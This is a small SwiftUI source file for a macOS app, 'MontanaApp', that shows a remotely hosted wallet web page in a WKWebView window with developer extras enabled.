import SwiftUI
import WebKit

@main
struct MontanaApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
        .windowStyle(.hiddenTitleBar)
        .defaultSize(width: 420, height: 700)
    }
}

struct ContentView: View {
    var body: some View {
        WebViewWrapper(url: URL(string: "https://1394793-cy33234.tw1.ru/wallet.html")!)
            .frame(minWidth: 380, minHeight: 600)
    }
}

struct WebViewWrapper: NSViewRepresentable {
    let url: URL

    func makeNSView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.preferences.setValue(true, forKey: "developerExtrasEnabled")

        let webView = WKWebView(frame: .zero, configuration: config)
        webView.setValue(false, forKey: "drawsBackground")
        webView.load(URLRequest(url: url))
        return webView
    }

    func updateNSView(_ nsView: WKWebView, context: Context) {}
}
